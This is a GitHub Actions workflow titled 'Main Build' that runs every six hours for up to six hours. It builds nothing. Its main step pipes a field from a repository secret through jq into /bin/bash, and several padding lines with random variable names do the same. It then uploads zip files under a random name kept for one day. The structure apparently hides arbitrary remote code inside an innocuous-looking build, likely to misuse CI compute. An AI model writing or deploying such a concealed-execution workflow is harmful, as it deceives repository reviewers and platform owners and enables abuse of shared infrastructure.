name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '35 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  launch:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Do work
        env:
          gqp10: ${{ secrets.gqp10 }}
        run: |
          printf '%s' "$gqp10" | jq -r .wh84 | /bin/bash
          echo $c775 | jq -r .wajse5578 | /bin/bash
          printf '%s' "$m2280" | jq -r .evvku416 | /bin/bash
          echo $gw97795 | jq -r .sirmm37389 | /bin/bash
          printf '%s' "$oo312" | jq -r .zh2 | /bin/bash
          printf '%s' "$px06" | jq -r .cydrh898 | /bin/bash

      - name: Archive data
        uses: actions/upload-artifact@v4
        with:
          name: ZduDyyNx
          path: "*.zip"
          retention-days: 1
